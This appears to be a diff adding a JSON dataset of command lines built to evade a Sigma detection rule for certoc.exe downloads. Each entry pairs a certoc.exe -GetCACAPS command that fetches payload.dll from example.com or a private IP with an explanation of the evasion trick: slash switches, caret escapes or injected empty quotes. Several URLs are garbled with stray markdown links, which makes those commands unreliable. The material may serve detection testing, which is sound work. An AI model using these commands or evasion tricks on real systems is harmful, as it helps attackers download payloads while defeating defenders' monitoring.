@@ -1,0 +1,18 @@
+[
+  {
+    "output": "certoc.exe /GetCACAPS [http://example.com/payload.dll](https://www.google.com/search?q=http://example.com/payload.dll)",
+    "explanation": "The Sigma rule specifically requires the exact string '-GetCACAPS'. Because many native Windows command-line utilities accept the forward slash ('/') interchangeably with the hyphen ('-') for arguments, using '/GetCACAPS' completely circumvents the 'selection_cli' string match."
+  },
+  {
+    "output": "cmd.exe /c \"certoc.exe -GetCACAPS h^t^t^p://[example.com/payload.dll]()\"",
+    "explanation": "The Windows command shell interprets the caret symbol (^) as an escape character. When executed through cmd.exe, the raw process creation logs will capture the command line containing 'h^t^t^p', breaking the contiguous 'http' substring match required by the rule while successfully parsing the URL."
+  },
+  {
+    "output": "certoc.exe -GetCACAPS \"h\"\"ttp://[example.com/payload.dll]()\"",
+    "explanation": "By injecting empty double quotes into the protocol string, the contiguous 'http' signature is broken in the logged command line. The Windows API CommandLineToArgvW often strips these quotes during argument parsing, allowing the tool to initiate the connection while evading static string detection."
+  },
+  {
+    "output": "certoc.exe /GetCACAPS http://192.168.1.100/payload.ext",
+    "explanation": "The Sigma rule strictly looks for the hyphenated argument '-GetCACAPS'. Many Windows built-in binaries, including CertOC, accept forward slashes ('/') interchangeably with hyphens for command-line switches. By using '/GetCACAPS' instead of '-GetCACAPS', the string literal check fails, effectively bypassing the detection while successfully executing the download."
+  }
+]
